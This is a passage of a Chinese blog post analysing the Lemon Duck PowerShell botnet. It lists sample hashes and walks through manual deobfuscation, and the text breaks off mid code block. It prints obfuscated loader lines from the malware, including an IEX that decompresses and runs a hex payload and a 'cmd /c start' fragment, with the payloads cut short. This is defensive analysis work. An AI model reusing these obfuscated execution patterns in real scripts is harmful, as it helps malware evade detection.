27.12 25.76 26.8 25.76 Z M 33.2 9.84 Q 32.28 9.84 32.28 9.16 Q 32.28 8.68 32.8 8.12 Q 33.32 7.56 34.32 7.32 Q 34.92 7.16 35.3 7.14 Q 35.68 7.12 36.04 7 Q 35.88 7.76 35.38 8.64 Q 34.88 9.52 34.08 9.72 Q 33.68 9.84 33.2 9.84 Z" data-astro-cid-cagdmauf></path> </g> </svg> </div> </a>  <nav class="flex items-center gap-4.8 w-full lt-md:justify-end
    justify-end" aria-label="Main menu">  <div class="grid grid-flow-col items-center gap-4.8 print:op-0
              false
              "> <a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/mywebsite/blog/" title="Blog" aria-label="Blog" aria-current="false">  <span>Blog</span></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/mywebsite/projects/" title="Projects" aria-label="Projects" aria-current="false">  <span>Projects</span></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/mywebsite/photos/" title="Photos" aria-label="Photos" aria-current="false">  <div class="i-ri-camera-ai-line"></div></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/mywebsite/shorts/" title="Shorts" aria-label="Shorts" aria-current="false">  <div class="i-meteor-icons-grid"></div></a><hr class="w-0.25 h-[85%] b-t-0 bg-[#ddd] dark:bg-[#333] lt-md:hidden" aria-hidden="true"><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="https://github.com/nickyl07" title="Github" aria-label="Github" rel="me">  <div class="i-uil-github-alt"></div></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="https://x.com/noknoku07_nok" title="Twitter" aria-label="Twitter" rel="me">  <div class="i-ri-twitter-x-fill"></div></a><hr class="w-0.25 h-[85%] b-t-0 bg-[#ddd] dark:bg-[#333] lt-md:hidden" aria-hidden="true"><!-- Search Switch --><button type="button" id="search-switch" class="op-60 hover:op-100 op-transition" title="Search" aria-label="Search"> <div u-i-grommet-icons-search></div> </button> <!-- Search Panel --> <search-panel role="dialog" id="search-panel" class="hidden z-200 fixed top-15% lt-lgp:top-10% left-50% translate-x--50%
    grid grid-rows-[auto_1fr_auto]
    w-42rem lt-lgp:w-90% max-h-70vh lt-lgp:max-h-80vh p-3 lt-lgp:pb-1 rounded-lg
    text-[var(--c-text)] bg-[var(--c-bg)] shadow-custom_0_0_10_0" aria-modal="true" aria-labelledby="search-label" aria-keyshortcuts="ArrowUp,ArrowDown,Enter,Esc" data-filter="true" data-batch-size="5" data-max-items="3"> <div class="flex flex-col gap-2"> <!-- Tab list --> <div role="tablist" class="search-tabs flex gap-2 justify-start items-center text-xs" aria-label="Search categories"> <button type="button" role="tab" class="px-1.5 py-0.5 rounded
                bg-[#88888816]! dark:bg-[#88888823]!
                aria-[selected=false]:op-40 aria-[selected=true]:op-100
                aria-[selected=false]:hover:op-70 op-transition cursor-pointer" data-type="blog"> Blog </button><button type="button" role="tab" class="px-1.5 py-0.5 rounded
                bg-[#88888816]! dark:bg-[#88888823]!
                aria-[selected=false]:op-40 aria-[selected=true]:op-100
                aria-[selected=false]:hover:op-70 op-transition cursor-pointer" data-type="projects"> Projects </button> </div> <!-- Search Bar --> <div class="grid grid-cols-[auto_1fr] items-center
        h-10 px-3 rounded-md
        bg-[#88888811] dark:bg-[#88888818]"> <div u-i-grommet-icons-search></div> <label for="search-input" id="search-label" class="sr-only"></label> <input type="search" role="combobox" id="search-input" class="h-full pl-2 bg-transparent outline-0" autocomplete="off" autocorrect="off" spellcheck="false" aria-labelledby="search-label" aria-autocomplete="list" aria-controls="search-results" aria-expanded="false"> </div> </div> <!-- Search Results --> <div role="listbox" id="search-results" class="overflow-y-auto my-1" aria-labelledby="search-input" tabindex="-1" data-base="/mywebsite/"> <!-- Results --> <div id="search-content"></div> <!-- Feedback --> <div id="search-feedback" class="hidden py-3 text-center text-sm op-40"></div> <!-- Pagination --> <div id="search-pagination" style="display: none" class="items-center justify-center gap-4 pt-4 pb-3 text-xs"> <button class="flex items-center justify-center gap-1 op-40 hover:op-100 op-transition" data-action="more"> <div u-i-material-symbols-arrow-cool-down></div> <span></span> </button> <button class="flex items-center justify-center gap-1 op-40 hover:op-100 op-transition" data-action="all"> <div u-i-material-symbols-expand-all></div> <span></span> </button> </div> </div> <!-- Shortcuts Footer --> <footer role="note" aria-label="Keyboard shortcuts"> <ul class="flex flex-wrap items-center gap-4.5 lt-md:hidden
        pt-3 border-t border-[#7d7d7d4d]
        text-xs op-40 select-none"> <li class="flex items-center gap-1"> <kbd class="search-kbd-key"> <div u-i-material-symbols-arrow-upward></div> </kbd> <kbd class="search-kbd-key"> <div u-i-material-symbols-arrow-downward></div> </kbd> <span>Navigate</span> </li> <li class="flex items-center gap-1"> <kbd class="search-kbd-key"> <div u-i-grommet-icons-return></div> </kbd> <span>Go to Page</span> </li> <li class="flex items-center gap-1"> <kbd class="search-kbd-key">esc</kbd> <span>Close</span> </li> </ul> </footer> </search-panel> <script type="module" src="/mywebsite/_astro/SearchSwitch.astro_astro_type_script_index_0_lang.ByiBzNYd.js"></script> <script type="module" src="/mywebsite/_astro/SearchSwitch.astro_astro_type_script_index_1_lang.YoRIvrBK.js"></script> <!-- https://github.com/pagefind/pagefind/blob/production-docs/pagefind_web_js/types/index.d.ts --> <script>(function(){const scriptUrl = "/mywebsite/pagefind/pagefind.js";
const navHighlight = true;

    async function loadPagefind() {
      const pagefind = await import(scriptUrl)

      // https://pagefind.app/docs/search-config/
      await pagefind.options({
        'excerptLength': 20,
        ...(navHighlight && {
          'highlightParam': 'search'
        }),

        // https://pagefind.app/docs/ranking/
        ranking: {
          termFrequency: 0.6,
          termSimilarity: 1.0,
          pageLength: 0.0,
          termSaturation: 1.4
        }
      })

      pagefind.init()
      window.pagefind = pagefind
    }

    if (!window.pagefind) loadPagefind()
  })();</script> <script>(function(){const scriptUrl = "/mywebsite/pagefind/pagefind-highlight.js";

    async function loadPagefindHighlight() {
      await import(scriptUrl)

      const PagefindHighlight = window.PagefindHighlight
      if (!PagefindHighlight) return
      const pagefindHighlight = new PagefindHighlight({
        // https://pagefind.app/docs/highlight-config
        highlightParam: "search",
        markContext: "[data-pagefind-body]",
        markOptions: {
          // https://markjs.io/#mark
          className: "pagefind-highlight",
          exclude: ["[data-pagefind-ignore]", "[data-pagefind-ignore] *"],
        },
        addStyles: false,
      });

      window.pagefindHighlight = pagefindHighlight
    }

    if (!window.pagefindHighlight) loadPagefindHighlight()
  })();</script> <script type="module">document.addEventListener("astro:page-load",()=>{new URLSearchParams(location.search).has("search")&&pagefindHighlight.highlight()});</script><button id="theme-switch" class="op-60 hover:op-100 op-transition" title="Toggles light & dark" aria-label="Toggles light & dark"> <div u-i-ri-sun-line u-dark:i-ri-moon-line></div> </button> <!-- Initialize as inline scripts for faster response, avoiding FOUC  --> <script data-astro-rerun>
  function initTheme() {
    let theme
    if (typeof localStorage !== 'undefined' && localStorage.getItem('theme')) {
      theme = localStorage.theme
    } else {
      theme = window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
      window.localStorage.setItem('theme', theme)
    }

    const toggleThemeButton = document.getElementById('theme-switch')
    toggleThemeButton.setAttribute('role', 'switch')

    if (theme === 'light') {
      document.documentElement.classList.remove('dark')
      toggleThemeButton.setAttribute('aria-label', 'light')
      toggleThemeButton.setAttribute('aria-checked', 'false')
    } else {
      document.documentElement.classList.add('dark')
      toggleThemeButton.setAttribute('aria-label', 'dark')
      toggleThemeButton.setAttribute('aria-checked', 'true')
    }

    const colorThemeMetaTag = document.querySelector("meta[name='theme-color']")
    const bgColor = getComputedStyle(document.body).getPropertyValue('--c-bg')
    colorThemeMetaTag?.setAttribute('content', bgColor)
  }

  initTheme()
</script> <script type="module">const p=()=>{const e=navigator.userAgentData;return e?.brands?.length&&e.brands.some(d=>/Chrom(e|ium)/i.test(d.brand))?"both":"none"},f=p();document.addEventListener("astro:page-load",()=>{let e;const c=t=>{const n=t?`${location.origin}/giscus/dark.css`:`${location.origin}/giscus/light.css`,o=document.getElementById("giscus-script");if(o){o.setAttribute("data-theme",n);const s=document.querySelector("iframe.giscus-frame");s&&s instanceof HTMLIFrameElement&&s.contentWindow&&s.contentWindow.postMessage({giscus:{setConfig:{theme:n}}},"https://giscus.app")}},r=t=>{t.setAttribute("aria-label",e?"dark":"light"),t.setAttribute("aria-checked",e?"true":"false")},d=()=>{const t=document.querySelector("meta[name='theme-color']"),n=getComputedStyle(document.body).getPropertyValue("--c-bg");t?.setAttribute("content",n)},u=()=>{window.localStorage.setItem("theme",e?"dark":"light")},g=t=>{const n=t.currentTarget,o=()=>{document.documentElement.classList.toggle("dark"),e=document.documentElement.classList.contains("dark"),c(e),r(n),d(),u()};if(!(document.startViewTransition&&!window.matchMedia("(prefers-reduced-motion: reduce)").matches)){o();return}const i=t.clientX,a=t.clientY,h=Math.hypot(Math.max(i,innerWidth-i),Math.max(a,innerHeight-a));document.startViewTransition(()=>o()).ready.then(()=>{const l=[`circle(0px at ${i}px ${a}px)`,`circle(${h}px at ${i}px ${a}px)`];document.documentElement.animate({clipPath:e?l.reverse():l},{duration:400,easing:"ease-out",fill:f,pseudoElement:e?"::view-transition-old(root)":"::view-transition-new(root)"})})},m=document.getElementById("theme-switch");m?.addEventListener("click",g),window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:t})=>{e=t,document.documentElement.classList.toggle("dark",e),c(e),m&&r(m),u()})});</script><a class="op-60 no-underline hover:op-100 op-transition lt-md:hidden" href="/mywebsite/rss.xml" title="RSS Feed" aria-label="RSS Feed">   <div u-i-lucide-rss></div> </a> </div> <button id="nav-open-button" class="hidden lt-md:block op-60 hover:op-100 op-transition" title="Navigation" aria-label="Navigation" aria-expanded="false" aria-controls="nav-panel"> <div u-i-ri-menu-line></div> </button> <div id="nav-panel" class="hidden! z-200 fixed top-10% left-50% translate-x--50%
    overflow-y-auto flex flex-col gap-5
    w-90% max-h-80vh py-4 px-6 rounded-lg
  bg-[var(--c-bg)] shadow-custom_0_0_10_0 text-[var(--c-text)]"> <ul> <li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/mywebsite/blog/" title="Blog" aria-label="Blog" aria-current="false">  <span>Blog</span></a></li><li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/mywebsite/projects/" title="Projects" aria-label="Projects" aria-current="false">  <span>Projects</span></a></li><li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/mywebsite/photos/" title="Photos" aria-label="Photos" aria-current="false">  <span>Photos</span></a></li><li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/mywebsite/shorts/" title="Shorts" aria-label="Shorts" aria-current="false">  <span>Shorts</span></a></li> </ul> <div class="flex justify-center items-center gap-4"> <a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="https://github.com/nickyl07" title="Github" aria-label="Github" rel="me">  <div class="i-uil-github-alt"></div></a><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="https://x.com/noknoku07_nok" title="Twitter" aria-label="Twitter" rel="me">  <div class="i-ri-twitter-x-fill"></div></a><a class="op-60 no-underline hover:op-100 op-transition op-50!" href="/mywebsite/rss.xml" title="RSS Feed" aria-label="RSS Feed">   <div u-i-lucide-rss></div> </a>  </div> </div> <script type="module" src="/mywebsite/_astro/NavSwitch.astro_astro_type_script_index_0_lang.lh05xrMp.js"></script> </nav> </header> <!-- Main --> <main id="main" class="px-7 py-10"> <!-- Content -->  <header class="prose mx-auto mb-8"> <h1>基于 PowerShell 模块驱动的柠檬鸭（Lemon Duck）深度分析报告</h1>   <div class="mt--6! op-50"><time datetime="2025-04-01T00:00:00.000Z">2025年4月1日</time><span> · 26 min</span></div>  </header> <article class="slide-enter-content prose mx-auto" data-pagefind-body data-pagefind-filter="collection:blog"> <script type="module" src="/mywebsite/_astro/TocButton.astro_astro_type_script_index_0_lang.CJR-4Jo8.js"></script><script type="module">class h extends HTMLElement{#n;#s;#i=null;#t=new Map;#o=null;#e=[];connectedCallback(){this.#c(()=>this.#l())}disconnectedCallback(){this.#f()}#l=()=>{this.#n=this.#h(this.dataset.minH),this.#s=this.#h(this.dataset.maxH);const t=this.#r("a",!1);this.#d(t);const e=this.#n&&this.#s?this.#r(this.#u(this.#n,this.#s)):this.#r(".toc-heading");this.#i=new IntersectionObserver(this.#a,{root:null,rootMargin:"0% 0% -75% 0%",threshold:0});for(const n of e)this.#i.observe(n)};#c=t=>(window.requestIdleCallback||(e=>setTimeout(e,1)))(t);#a=t=>{if(!t.length)return;let e=t[0];for(let o=1;o<t.length;o++)t[o].time>e.time&&(e=t[o]);const n=e.target;if(!n)return;const i=e.boundingClientRect.top>window.innerHeight/4?this.#g(this.#t,n):n;if(!i||i===this.#o)return;const r=this.#t.get(i)??[];if(this.#e&&this.#e.length)for(const o of this.#e)o.removeAttribute("aria-current");for(const o of r)o.setAttribute("aria-current","true"),o.scrollIntoView({behavior:"smooth",block:"center"});this.#o=i,this.#e=r};#h=t=>t?parseInt(t,10):void 0;#r=(t,e=!0)=>e?Array.from(document.querySelectorAll(t)):Array.from(this.querySelectorAll(t));#d=t=>{for(const e of t){const{hash:n}=new URL(e.href),s=decodeURIComponent(n.replace(/^#/,"")),i=document.getElementById(s);i&&(this.#t.has(i)?this.#t.get(i)?.push(e):this.#t.set(i,[e]))}};#u=(t,e,n="")=>{const s=[];for(let i=t;i<=e;i++)n?s.push(`${n} h${i}`):s.push(`h${i}`);return s.join(", ")};#g=(t,e)=>{let n=null;for(const s of t.keys()){if(s===e)return n;n=s}return null};#f=()=>{this.#i?.disconnect(),this.#i=null,this.#t.clear(),this.#o=null,this.#e=[]}}customElements.define("table-of-contents",h);</script><aside> <table-of-contents data-min-h="2" data-max-h="4"> <!-- Greater than or equal to 1128px --> <nav class="toc-desktop toc-desktop-content"> <div class="toc-desktop-anchor i-ri-menu-2-fill"></div> <ul> <li><a class="op-60 no-underline hover:op-100" href="#基本信息" aria-label="Scroll to 基本信息">  基本信息</a></li><li><a class="op-60 no-underline hover:op-100" href="#反混淆方法论" aria-label="Scroll to 反混淆方法论">  反混淆方法论</a></li><li><a class="op-60 no-underline hover:op-100" href="#核心样本分析" aria-label="Scroll to 核心样本分析">  核心样本分析</a><ul><li><a class="op-60 no-underline hover:op-100" href="#gimjsp攻击的初始入口" aria-label="Scroll to gim.jsp：攻击的初始入口">  gim.jsp：攻击的初始入口</a></li><li><a class="op-60 no-underline hover:op-100" href="#ajsp第二阶段攻击" aria-label="Scroll to a.jsp：第二阶段攻击">  a.jsp：第二阶段攻击</a></li><li><a class="op-60 no-underline hover:op-100" href="#功能模块层" aria-label="Scroll to 功能模块层">  功能模块层</a></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#ifbin内网渗透与传播模块" aria-label="Scroll to if.bin：内网渗透与传播模块">  if.bin：内网渗透与传播模块</a></li></ul></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#krbin竞品清理与防御削弱" aria-label="Scroll to kr.bin：竞品清理与防御削弱">  kr.bin：竞品清理与防御削弱</a></li></ul></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#处置建议" aria-label="Scroll to 处置建议">  处置建议</a></li>  </ul> </nav> <!-- less than 1128px --> <button id="toc-open-button" class="z-50 fixed right-5 bottom-18
    w-10 h-10 rounded-full
    op-0 bg-#8883 dark:bg-#8886 pointer-events-none op-transition
    lt-lgp:op-50 lt-lgp:pointer-events-auto
    hover:op-100 print:hidden" title="Open table of contents"> <div u-i-lucide-table-of-contents class="text-gray-700 dark:text-gray-200"></div> </button> <nav id="toc-panel" class="hidden! z-200 fixed top-10% left-50% translate-x--50%
    overflow-y-auto flex flex-col
    w-90% max-h-80vh py-4 px-6 rounded-lg
    bg-[var(--c-bg)] shadow-custom_0_0_10_0 text-[var(--c-text)]"> <div class="pb-1 b-b b-[var(--c-text)]">Table of Contents</div> <ul class="text-sm"> <li><a class="op-60 no-underline hover:op-100" href="#基本信息" aria-label="Scroll to 基本信息">  基本信息</a></li><li><a class="op-60 no-underline hover:op-100" href="#反混淆方法论" aria-label="Scroll to 反混淆方法论">  反混淆方法论</a></li><li><a class="op-60 no-underline hover:op-100" href="#核心样本分析" aria-label="Scroll to 核心样本分析">  核心样本分析</a><ul><li><a class="op-60 no-underline hover:op-100" href="#gimjsp攻击的初始入口" aria-label="Scroll to gim.jsp：攻击的初始入口">  gim.jsp：攻击的初始入口</a></li><li><a class="op-60 no-underline hover:op-100" href="#ajsp第二阶段攻击" aria-label="Scroll to a.jsp：第二阶段攻击">  a.jsp：第二阶段攻击</a></li><li><a class="op-60 no-underline hover:op-100" href="#功能模块层" aria-label="Scroll to 功能模块层">  功能模块层</a></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#ifbin内网渗透与传播模块" aria-label="Scroll to if.bin：内网渗透与传播模块">  if.bin：内网渗透与传播模块</a></li></ul></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#krbin竞品清理与防御削弱" aria-label="Scroll to kr.bin：竞品清理与防御削弱">  kr.bin：竞品清理与防御削弱</a></li></ul></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#处置建议" aria-label="Scroll to 处置建议">  处置建议</a></li> </ul> </nav>  </table-of-contents> </aside> <p>柠檬鸭（Lemon Duck）是<strong>高度模块化</strong>且<strong>完全由脚本驱动</strong>的僵尸网络框架。其核心技术特征建立在<strong>高度混淆的 PowerShell 脚本链</strong>之上。通过将不同的攻击功能（渗透、持久化、排他、挖矿载荷部署）拆解为独立的脚本模块，柠檬鸭实现了极高的灵活性与防御逃逸能力。</p>
<h2 id="基本信息">基本信息<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 基本信息" data-pagefind-ignore="" href="#基本信息">#</a></h2>
<div>





























<table><thead><tr><th>文件名</th><th>MD5 哈希值</th><th>功能描述</th></tr></thead><tbody><tr><td><code>gim.jsp</code></td><td>b6f0e01c9e2676333490a750e58d4464</td><td>攻击的初始入口</td></tr><tr><td>a.jsp</td><td>c21caa84b327262f2cbcc12bbb510d15</td><td>攻击的核心调度器</td></tr><tr><td><code>if.bin</code></td><td>888dc1ca4b18a3d424498244acf81f7d</td><td>横向扩散核心</td></tr><tr><td><code>kr.bin</code></td><td>e04acec7ab98362d87d1c53d84fc4b03</td><td>挖矿核心</td></tr></tbody></table></div>
<h2 id="反混淆方法论">反混淆方法论<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 反混淆方法论" data-pagefind-ignore="" href="#反混淆方法论">#</a></h2>
<p>混淆并非柠檬鸭的附加功能，而是其<strong>生存基石</strong>。</p>
<p>脚本采用<strong>字符串反转、无意义字符拼接干扰、字符集索引截取、关键字倒序、变量随机命名</strong>等多种混淆手法。</p>
<p>以gim.jsp为案例使用手动反混淆方法</p>
<p>工具：Windows PowerShell 、记事本</p>
<p>方法：“识别IEX，删除，运行”</p>
<p>识别IEX：如果你不知道这行具体做什么，就用PowerShel运行，就像下面一样。下图显示，实际上是Invoke-Expression cmdlet。<em>.( $veRbosePrEfERENCe.TOStrIng()[1,3]+‘X’-joIn”)</em></p>
<p><img alt="6" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 760px) 760px, 100vw"  data-astro-image="constrained" width="760" height="269" src="/mywebsite/_astro/20260221222602028_Z2tEH7q.webp" srcset="/mywebsite/_astro/20260221222602028_rghoY.webp 640w, /mywebsite/_astro/20260221222602028_ZrHKaM.webp 750w, /mywebsite/_astro/20260221222602028_Z2tEH7q.webp 760w"></p>
<p>参考：<a href="https://fareedfauzi.github.io/2021/02/06/LemonDuck-Powershell.html#final-result">简单的解混之法</a></p>
<p>原文件：</p>
<div class="expressive-code"><link rel="stylesheet" href="/mywebsite/_astro/ec.p1vpi.css"><script type="module" src="/mywebsite/_astro/ec.p1z7b.js"></script><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="powershell"><code><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">I</span><span style="--0:#CB7676;--1:#AB5959">`</span><span style="--0:#DBD7CAEE;--1:#393A34">EX </span><span style="--0:#666666;--1:#999999">$(</span><span style="--0:#B8A965;--1:#998418">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> IO.StreamReader </span><span style="--0:#666666;--1:#999999">($(</span><span style="--0:#B8A965;--1:#998418">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> IO.Compression.DeflateStream </span><span style="--0:#666666;--1:#999999">($(</span><span style="--0:#B8A965;--1:#998418">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> IO.MemoryStream </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#666666;--1:#999999">$(</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">edbd07601c49962........05f7cfc31fdfa1b27ff0f</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#CB7676;--1:#AB5959">-split</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">(..)</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#4D9375;--1:#1E754F">?</span><span style="--0:#666666;--1:#999999">{$</span><span style="--0:#B8A965;--1:#998418">_</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#4D9375;--1:#1E754F">%</span><span style="--0:#666666;--1:#999999">{[</span><span style="--0:#CB7676;--1:#AB5959">convert</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::ToUInt32</span><span style="--0:#666666;--1:#999999">($</span><span style="--0:#B8A965;--1:#998418">_</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#4C9A91;--1:#2F798A">16</span><span style="--0:#666666;--1:#999999">)})))</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#CB7676;--1:#AB5959">IO.Compression.CompressionMode</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::Decompress</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#CB7676;--1:#AB5959">Text.Encoding</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::ASCII</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#DBD7CAEE;--1:#393A34">.ReadToEnd</span><span style="--0:#666666;--1:#999999">();</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="I&#x60;EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$(&#x27;edbd07601c49962........05f7cfc31fdfa1b27ff0f&#x27;-split&#x27;(..)&#x27;|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"><div></div></button></div></figure></div>
<p>第一层去混淆操作：删掉”I`EX”</p>
<p>修改后运行：</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="powershell"><code><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">echo</span><span style="--0:#666666;--1:#999999">$($(</span><span style="--0:#B8A965;--1:#998418">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> IO.StreamReader </span><span style="--0:#666666;--1:#999999">($(</span><span style="--0:#B8A965;--1:#998418">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> IO.Compression.DeflateStream </span><span style="--0:#666666;--1:#999999">($(</span><span style="--0:#B8A965;--1:#998418">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> IO.MemoryStream </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#666666;--1:#999999">$(</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">edbd07601c49962........05f7cfc31fdfa1b27ff0f</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#CB7676;--1:#AB5959">-split</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">(..)</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#4D9375;--1:#1E754F">?</span><span style="--0:#666666;--1:#999999">{$</span><span style="--0:#B8A965;--1:#998418">_</span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#4D9375;--1:#1E754F">%</span><span style="--0:#666666;--1:#999999">{[</span><span style="--0:#CB7676;--1:#AB5959">convert</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::ToUInt32</span><span style="--0:#666666;--1:#999999">($</span><span style="--0:#B8A965;--1:#998418">_</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#4C9A91;--1:#2F798A">16</span><span style="--0:#666666;--1:#999999">)})))</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#CB7676;--1:#AB5959">IO.Compression.CompressionMode</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::Decompress</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#CB7676;--1:#AB5959">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#CB7676;--1:#AB5959">Text.Encoding</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::ASCII</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#DBD7CAEE;--1:#393A34">.ReadToEnd</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">></span><span style="--0:#DBD7CAEE;--1:#393A34"> .\decoded_1.txt</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="echo$($(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$(&#x27;edbd07601c49962........05f7cfc31fdfa1b27ff0f&#x27;-split&#x27;(..)&#x27;|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd(); > .\decoded_1.txt"><div></div></button></div></figure></div>
<p>第二层先用<a href="https://cyberchef.org/">cyberchef</a>整体反转</p>
<p>删除”&#x26;( <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>S</mi><mi>h</mi><mi>O</mi><mi>M</mi><mi>e</mi><mo stretchy="false">[</mo><mn>21</mn><mo stretchy="false">]</mo><mo>+</mo></mrow><annotation encoding="application/x-tex">pShOMe[21]+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">pS</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.10903em;">OM</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord">21</span><span class="mclose">]</span><span class="mord">+</span></span></span></span>PSHOme[34]+‘x’)”、”( hCNVErbosepREFEReNcE.TOstRiNG()[1,3]+tfUxtf’+‘U-JoIntfUtfU)”</p>
<p>修改后运行：</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="powershell"><code><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">$</span><span style="--0:#BD976A;--1:#B07D48">de</span><span style="--0:#666666;--1:#999999">=$((</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959"> ( ((tfUcm</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#666666;--1:#999999">+</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">d /c start........[CHaR]39  -ReplaCE  </span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#DBD7CAEE;--1:#393A34">hCN</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">,[CHaR]36)| &#x26;( $pShOMe[21]+$PSHOme[34]+</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#DBD7CAEE;--1:#393A34">x</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">)</span></div></div><div class="ec-line"><div class="code">
